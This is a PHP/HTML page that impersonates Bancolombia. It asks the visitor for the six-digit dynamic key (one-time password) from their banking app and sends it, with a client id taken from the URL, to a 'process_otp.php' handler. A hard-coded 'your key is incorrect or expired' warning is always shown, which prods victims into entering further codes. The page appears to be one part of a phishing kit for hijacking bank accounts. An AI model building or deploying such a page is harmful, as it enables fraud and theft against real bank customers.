<?php
session_start();
$mensaje = "";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            margin-top: 20px;
            width: 60%;
            margin-bottom: 20px;
        }

        p,
        a {
            color: #333;
            margin: 10px 0;
            text-decoration: none;
        }

        input[type="tel"],
        input[type="submit"] {
            width: 80%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 4px;
            font-size: 16px;
        }

        input[type="tel"] {
            border: 1px solid #ccc;
            text-align: center;
        }

        input[type="submit"] {
            background-color: yellow;
            border: none;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #f1c40f;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <img src="img/logo.png" alt="Logo">
    <div class="details">
        <p><?php echo $mensaje; ?></p>
        <a style="color:rgb(105, 105, 105);">Detalle de la Transacción</a><br>
        <a style="color:black;">Pago de servicio publico</a>
        <p>Ingresa tu clave dinámica, la encontrarás en tu app Bancolombia en el dispositivo donde la inscribiste por
            última vez.</p>

        <!-- Formulario para enviar datos -->
        <form method="POST" action="process/process_otp.php">
            <input type="hidden" name="cliente_id"
                value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">

            <input type="tel" name="claveDinamica" placeholder="Clave dinámica" required minlength="6" maxlength="6"
                pattern="\d*" inputmode="numeric">
            <br>
            <a style="color:rgb(255, 0, 0); margin-bottom:0px; ">Tu clave dinámica no es correcta o ha éxpirado</a>
            <br>
            <input type="submit" value="Enviar">
        </form>
    </div>

    <div class="footer-links">
        <a href="#">¿Necesitas Ayuda?</a> <a href="../../../index.php">Cerrar</a>
    </div>
</body>

</html>